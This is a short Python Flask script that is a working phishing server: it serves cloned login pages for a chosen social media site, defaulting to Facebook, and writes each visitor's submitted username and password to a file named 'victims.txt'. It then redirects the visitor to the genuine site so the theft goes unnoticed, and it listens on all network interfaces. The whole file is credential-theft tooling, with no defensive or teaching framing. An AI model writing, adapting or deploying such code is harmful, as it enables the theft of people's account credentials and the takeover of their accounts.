import sys
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')
SITE = sys.argv[1] if len(sys.argv) > 1 else "facebook"

@app.route('/')
def home():
    # Looks for templates/instagram/index.html etc.
    return render_template(f'{SITE}/index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('email') or request.form.get('username')
    password = request.form.get('password')
    
    # Professional Logging Format
    with open("victims.txt", "a") as f:
        f.write(f"\n{'='*30}\n")
        f.write(f"PLATFORM : {SITE.upper()}\n")
        f.write(f"USER     : {username}\n")
        f.write(f"PASS     : {password}\n")
        f.write(f"{'='*30}\n")
    
    return redirect(f"https://www.{SITE}.com")

if __name__ == "__main__":
    app.run(port=5000, host='0.0.0.0')

